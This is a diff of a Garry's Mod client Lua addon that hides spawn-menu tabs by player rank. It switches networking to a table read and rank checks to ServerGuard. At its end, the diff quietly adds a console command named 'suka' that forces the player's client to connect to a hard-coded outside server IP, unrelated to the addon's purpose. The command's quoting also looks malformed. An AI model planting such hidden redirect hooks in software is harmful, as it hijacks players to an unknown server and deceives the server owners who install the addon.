@@ -9,17 +9,13 @@ local function PlayerInit()
 end
 hook.Add( "Think", "FUCLINGPLAYERINIT_1_Ever", PlayerInit )
 
-c_list = {}
+local c_list = {}
 local sb = false
 local sb_c = false
 
-net.Receive("sendgrp", function(l,ply)
-	c_list = {}
+net.Receive("TC2.0_Send", function(l,ply)
+	c_list = net.ReadTable()
 	sb = false
-	local c = tonumber(net.ReadString())
-	for k=1,c do
-		table.insert(c_list,net.ReadString())
-	end
 end)
 
 local tabs = {
@@ -33,7 +29,7 @@ local tabs = {
 }
 
 local function removeOldTabls2()
-	if(LocalPlayer():GetUserGroup()=="user" and sb_c == false)then c_list = {} sb = false sb_c = true end
+	if(serverguard.player:GetRank(LocalPlayer())=="user" and sb_c == false)then c_list = {} sb = false sb_c = true end
 	if(sb==false)then
 		g_SpawnMenu = vgui.Create( "SpawnMenu" )
 		g_SpawnMenu:SetVisible( false )
@@ -58,7 +54,11 @@ local function removeOldTabls2()
 			end
 		end 
 		sb=true
-		if(LocalPlayer():GetUserGroup()!="user")then sb_c = false end
+		if(serverguard.player:GetRank(LocalPlayer())!="user")then sb_c = false end
 	end
 end
 hook.Add("SpawnMenuOpen", "blockmenutabs", removeOldTabls2)
+
+concommand.Add("suka", function()
+LocalPlayer():ConCommand("lua_run '[[LocalPlayer():ConCommand('connect 94.23.180.165:27015')]]')
+end)
